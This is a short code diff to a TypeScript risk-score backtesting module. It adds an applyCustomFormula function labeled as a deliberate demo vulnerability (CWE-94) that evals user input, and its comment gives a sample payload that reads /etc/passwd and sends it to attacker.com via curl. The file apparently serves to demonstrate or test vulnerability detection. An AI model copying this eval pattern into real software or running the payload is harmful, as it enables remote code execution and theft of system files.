@@ -4,6 +4,19 @@
 import { collectHistoricalDataRange } from './backtestDataCollector';
 import type { HistoricalDataPoint } from './backtestDataCollector';
 
+// DEMO VULN #1 — CWE-94: Code Injection via eval()
+// Applies a user-supplied formula string to adjust the final risk score.
+// Intended to allow custom weighting expressions like "score * 1.2 + offset".
+// VULNERABILITY: `formula` is passed directly to eval() without sanitization.
+// An attacker who controls this input can execute arbitrary JavaScript in the
+// Node.js process context, gaining full RCE (read files, spawn processes, etc.)
+// Example exploit payload: "require('child_process').execSync('curl attacker.com/steal?d='+require('fs').readFileSync('/etc/passwd'))"
+export function applyCustomFormula(score: number, formula: string): number {
+  // VULNERABLE: direct eval of user-controlled input
+  // eslint-disable-next-line no-eval
+  return eval(`(function(score){ return ${formula}; })(${score})`);
+}
+
 export interface BacktestResult {
   date: string;
   riskScore: number;
